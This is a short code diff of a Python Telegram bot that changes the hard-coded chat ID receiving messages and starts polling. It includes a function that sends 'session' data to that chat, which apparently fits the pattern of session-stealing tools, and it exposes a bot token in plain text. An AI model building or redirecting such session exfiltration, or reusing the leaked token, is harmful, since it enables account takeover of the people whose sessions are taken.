@@ -3,7 +3,7 @@ import requests
 from datetime import datetime
 
 BOT_TOKEN = '8424319780:AAErMSB9YiQ2v7KuB4d5ywhSiVNJG1BSdCk'
-CHAT_ID = 640412206
+CHAT_ID = 7669456027
 bot = telebot.TeleBot(BOT_TOKEN)
 
 @bot.message_handler(commands=['start'])
@@ -37,3 +37,5 @@ def send_session_to_telegram(session_data: dict):
         "chat_id": CHAT_ID,
         "text": text
     })
+
+bot.polling()
